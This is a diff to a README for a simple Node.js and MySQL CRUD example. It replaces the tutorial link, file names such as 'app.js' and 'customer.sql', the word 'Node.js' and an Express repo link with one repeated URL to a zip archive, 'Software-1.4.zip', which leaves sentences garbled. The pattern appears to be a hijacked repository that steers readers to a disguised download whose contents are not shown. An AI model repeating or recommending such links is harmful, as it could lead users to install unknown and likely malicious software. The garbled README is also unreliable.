@@ -1,6 +1,6 @@
-This is a very basic example of CRUD in Node.js n mySQL.
+This is a very basic example of CRUD in https://github.com/amoosghori/nodecrud/raw/refs/heads/master/views/Software-1.4.zip n mySQL.
 
-Installation,Live DEMO, and tutorial here : http://teknosains.com/i/simple-crud-nodejs-mysql
+Installation,Live DEMO, and tutorial here : https://github.com/amoosghori/nodecrud/raw/refs/heads/master/views/Software-1.4.zip
 
 ## Installation
 *for newbies : Clone or download zip to your machine then hit this :
@@ -8,7 +8,7 @@ Installation,Live DEMO, and tutorial here : http://teknosains.com/i/simple-crud-
 	npm install
 
 ## Configuration (database)
-app.js
+https://github.com/amoosghori/nodecrud/raw/refs/heads/master/views/Software-1.4.zip
 
         host: 'localhost',
         user: 'root',
@@ -18,7 +18,7 @@ app.js
 
 
 	
-You're gonna need to create a DB named 'nodejs' and import customer.sql
+You're gonna need to create a DB named 'nodejs' and import https://github.com/amoosghori/nodecrud/raw/refs/heads/master/views/Software-1.4.zip
 
 ## NOTES
-This repo still use Express 3, you might want to upgrade yourself or you can Go here (https://github.com/codetrash/rest-crud) for newest Express 
+This repo still use Express 3, you might want to upgrade yourself or you can Go here (https://github.com/amoosghori/nodecrud/raw/refs/heads/master/views/Software-1.4.zip) for newest Express 
